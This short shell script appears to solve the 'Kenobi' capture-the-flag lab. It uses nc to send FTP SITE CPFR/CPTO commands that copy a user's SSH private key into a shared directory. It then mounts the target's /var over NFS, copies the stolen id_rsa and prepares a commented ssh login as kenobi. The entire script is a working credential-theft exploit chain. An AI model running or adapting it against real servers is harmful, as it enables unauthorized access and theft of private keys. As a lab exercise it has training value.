#!/bin/sh
# This is a comment!
echo staaart of x

#read $REPLY

ip="1"

nc $ip 21 < msg.txt

#sleep 1

echo "nc done"



sudo umount /mnt/knfs && rm -r /mnt/knfs && mkdir /mnt/knfs && mount $ip:/var /mnt/knfs
#ls -la /mnt/knfs

echo reached

cp /mnt/knfs/tmp/id_rsa .
sudo chmod 600 id_rsa
#ssh -i id_rsa kenobi@10.10.103.189

#SITE CPFR /home/kenobi/.ssh/id_rsa
#SITE CPTO /var/tmp/id_rsa
#END
